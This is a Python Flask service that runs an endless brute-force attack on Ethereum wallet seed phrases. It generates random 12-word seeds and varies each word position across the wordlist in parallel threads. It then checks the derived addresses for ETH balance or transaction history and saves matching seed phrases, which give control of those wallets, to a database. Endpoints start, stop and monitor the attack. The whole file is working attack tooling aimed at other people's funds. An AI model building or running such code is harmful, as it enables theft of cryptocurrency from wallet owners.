import asyncio
import os
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import concurrent.futures

from database import db_manager, SeedMatch
from seed_utils import SeedGenerator

app = Flask(__name__)
CORS(app)

# Global state for attack management
attack_state = {
    "is_running": False,
    "current_cycle": 0,
    "total_attempts": 0,
    "matches_found": 0,
    "current_seed": None,
    "found_addresses": []
}

# Global lock for thread-safe operations
attack_lock = threading.Lock()

def process_position_thread(position: int, words: list, seed_gen: SeedGenerator, detection_method: str, 
                          attack_state: dict, original_word: str, results_queue, progress_callback=None):
    """Process a single word position in a separate thread"""
    position_attempts = 0
    position_matches = []
    
    try:
        # Replace this word with each word from wordlist
        for word_idx, candidate_word in enumerate(seed_gen.wordlist):
            if not attack_state["is_running"]:
                break
            
            # Create a copy of words for this thread
            test_words = words.copy()
            test_words[position] = candidate_word
            test_seed = " ".join(test_words)
            position_attempts += 1
            
            # Update global attempts counter (thread-safe)
            with attack_lock:
                attack_state["total_attempts"] += 1
            
            # Validate seed phrase
            if seed_gen.validate_seed(test_seed):
                try:
                    # Generate wallet address from seed
                    wallet_address = seed_gen.seed_to_address(test_seed)
                    
                    # Use selected detection method
                    has_activity = False
                    activity_value = 0
                    
                    if detection_method == "balance":
                        has_activity = seed_gen.has_balance(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_balance(wallet_address)
                    else:  # transaction count method
                        has_activity = seed_gen.has_transaction_history(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_transaction_count(wallet_address)
                    
                    if has_activity:
                        match_info = {
                            "position": position + 1,
                            "original_word": original_word,
                            "candidate_word": candidate_word,
                            "seed": test_seed,
                            "address": wallet_address,
                            "activity_value": activity_value,
                            "detection_method": detection_method,
                            "attempts": attack_state["total_attempts"]
                        }
                        position_matches.append(match_info)
                        
                except Exception as e:
                    print(f"Error processing seed in position {position + 1}: {e}")
            
            # Progress callback every 50 attempts per position
            if progress_callback and position_attempts % 50 == 0:
                progress_callback(position + 1, position_attempts)
    
    except Exception as e:
        print(f"Error in position {position + 1} thread: {e}")
    
    # Put results in queue
    results_queue.put({
        "position": position,
        "attempts": position_attempts,
        "matches": position_matches
    })

def run_brute_force_attack(max_attempts_per_cycle: int = 2048, detection_method: str = "transactions"):
    """Background task to run the fishing brute force attack"""
    seed_gen = SeedGenerator()
    
    try:
        attack_state["is_running"] = True
        attack_state["current_cycle"] = 0
        attack_state["total_attempts"] = 0
        attack_state["found_addresses"] = []
        
        print(f"Starting infinite brute force attack...")
        print(f"Target: {'Addresses with ETH balance' if detection_method == 'balance' else 'Addresses with transaction history'}")
        print(f"Method: Word variation attack - fix 11 words, iterate through 12th word")
        print(f"Checking: {'ETH balance checking' if detection_method == 'balance' else 'Transaction count checking'}")
        
        cycle = 0
        while attack_state["is_running"]:
            cycle += 1
            attack_state["current_cycle"] = cycle
            
            # Generate a random 12-word base seed
            base_seed = seed_gen.generate_random_seed()
            attack_state["current_seed"] = base_seed
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle}: Testing variations of: {base_seed}")
            
            words = base_seed.split()
            cycle_attempts = 0
            cycle_addresses_with_activity = 0
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🚀 Starting parallel processing of all 12 positions...")
            
            # Create thread-safe queue for results
            import queue
            results_queue = queue.Queue()
            
            # Progress tracking for each position
            position_progress = {i: 0 for i in range(12)}
            progress_lock = threading.Lock()
            
            def progress_callback(position, attempts):
                with progress_lock:
                    position_progress[position - 1] = attempts
                    total_progress = sum(position_progress.values())
                    if total_progress % 500 == 0:
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 Parallel progress: {total_progress} total attempts")
            
            # Start position threads in parallel (12 workers - maximum speed with direct blockchain access)
            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as executor:
                futures = []
                
                for position in range(12):
                    if not attack_state["is_running"]:
                        break
                    
                    original_word = words[position]
                    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🧵 Starting thread for position {position + 1} (original word: '{original_word}')")
                    
                    # Submit thread for this position
                    future = executor.submit(
                        process_position_thread,
                        position, words, seed_gen, detection_method,
                        attack_state, original_word, results_queue,
                        progress_callback
                    )
                    futures.append(future)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ⚡ All 12 position threads started! Processing in parallel with direct blockchain access...")
                
                # Wait for all threads to complete
                concurrent.futures.wait(futures)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ✅ All position threads completed!")
            
            # Collect results from all threads
            all_matches = []
            total_thread_attempts = 0
            
            while not results_queue.empty():
                result = results_queue.get()
                total_thread_attempts += result["attempts"]
                
                # Process any matches found
                for match in result["matches"]:
                    all_matches.append(match)
                    cycle_addresses_with_activity += 1
                    
                    if detection_method == "balance":
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 💰 ADDRESS WITH BALANCE FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original: '{match['original_word']}' → New: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Balance: {match['activity_value']} ETH ✅")
                    else:
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 ADDRESS WITH TRANSACTION HISTORY FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original: '{match['original_word']}' → New: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Transaction Count: {match['activity_value']} ✅")
                    
                    # Store match in database
                    try:
                        # Create async event loop for database operations
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        
                        seed_match = SeedMatch(
                            seed_phrase=match['seed'],
                            address=match['address'],
                            balance=match['activity_value'],
                            timestamp=datetime.utcnow(),
                            attempts_made=match['attempts']
                        )
                        
                        loop.run_until_complete(db_manager.store_successful_match(seed_match))
                        attack_state["matches_found"] += 1
                        attack_state["found_addresses"].append(match['address'])
                        
                        loop.close()
                    except Exception as e:
                        print(f"Error storing match: {e}")
            
            cycle_attempts = total_thread_attempts
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle} completed: {cycle_attempts} attempts, {attack_state['matches_found']} total matches found")
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Total attempts so far: {attack_state['total_attempts']}")
            
            # Small delay between cycles
            time.sleep(0.5)
        
        print(f"Attack stopped. Total attempts: {attack_state['total_attempts']}, Matches found: {attack_state['matches_found']}")
        
    except Exception as e:
        print(f"Error during brute force attack: {e}")
    finally:
        attack_state["is_running"] = False

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Simple connection test
        connected = True  # Simplified for now
        loop.close()
        
        return jsonify({
            "status": "healthy" if connected else "degraded",
            "timestamp": datetime.utcnow().isoformat(),
            "database_connected": connected
        })
    except:
        return jsonify({
            "status": "degraded",
            "timestamp": datetime.utcnow().isoformat(),
            "database_connected": False
        })

@app.route('/attack/start', methods=['POST'])
def start_attack():
    """Start a brute force attack"""
    if attack_state["is_running"]:
        return jsonify({"error": "Attack already running"}), 400
    
    data = request.get_json() or {}
    max_attempts_per_cycle = data.get('max_attempts_per_cycle', 2048)
    detection_method = data.get('detection_method', 'transactions')
    
    # Start the attack in a background thread
    attack_thread = threading.Thread(
        target=run_brute_force_attack,
        args=(max_attempts_per_cycle, detection_method)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    return jsonify({
        "message": "Infinite brute force attack started",
        "description": f"Will run forever generating random seeds and testing variations for {'addresses with balance' if detection_method == 'balance' else 'human-used addresses'}",
        "max_attempts_per_cycle": max_attempts_per_cycle,
        "detection_method": detection_method,
        "target": "Addresses with ETH balance" if detection_method == "balance" else "Addresses with transaction history (human-used wallets)",
        "method": "Word variation - fix 11 words, iterate through remaining word positions",
        "checking": f"{'ETH balance checking' if detection_method == 'balance' else 'Transaction count checking'} - only stores addresses with activity",
        "note": "Attack will run indefinitely until manually stopped via /attack/stop"
    })

@app.route('/attack/stop', methods=['POST'])
def stop_attack():
    """Stop the current attack"""
    if not attack_state["is_running"]:
        return jsonify({"error": "No attack currently running"}), 400
    
    attack_state["is_running"] = False
    return jsonify({"message": "Attack stopped"})

@app.route('/attack/status', methods=['GET'])
def get_attack_status():
    """Get current attack status"""
    return jsonify({
        "is_running": attack_state["is_running"],
        "current_cycle": attack_state["current_cycle"],
        "total_attempts": attack_state["total_attempts"],
        "matches_found": attack_state["matches_found"],
        "current_seed": attack_state["current_seed"]
    })

@app.route('/test/compare-balance-vs-txcount', methods=['POST'])
def compare_methods():
    """Compare ETH balance check vs transaction count check for an address"""
    data = request.get_json() or {}
    address = data.get('address', '').strip()
    
    if not address:
        return jsonify({"error": "Address required"}), 400
    
    try:
        seed_gen = SeedGenerator()
        
        import time
        
        # Test transaction count method
        start_time = time.time()
        tx_count = seed_gen.get_transaction_count(address)
        has_transactions = tx_count > 0
        tx_method_time = time.time() - start_time
        
        # Test balance method
        start_time = time.time()
        balance = seed_gen.get_balance(address)
        has_balance = balance > 0
        balance_method_time = time.time() - start_time
        
        return jsonify({
            "address": address,
            "transaction_method": {
                "transaction_count": tx_count,
                "has_activity": has_transactions,
                "response_time_ms": round(tx_method_time * 1000, 2),
                "result": "ACTIVE" if has_transactions else "INACTIVE"
            },
            "balance_method": {
                "balance_eth": balance,
                "has_balance": has_balance,
                "response_time_ms": round(balance_method_time * 1000, 2),
                "result": "HAS_FUNDS" if has_balance else "NO_FUNDS"
            },
            "comparison": {
                "methods_agree": has_transactions == has_balance,
                "tx_method_faster": tx_method_time < balance_method_time,
                "speed_difference_ms": round(abs(balance_method_time - tx_method_time) * 1000, 2)
            }
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port, debug=False)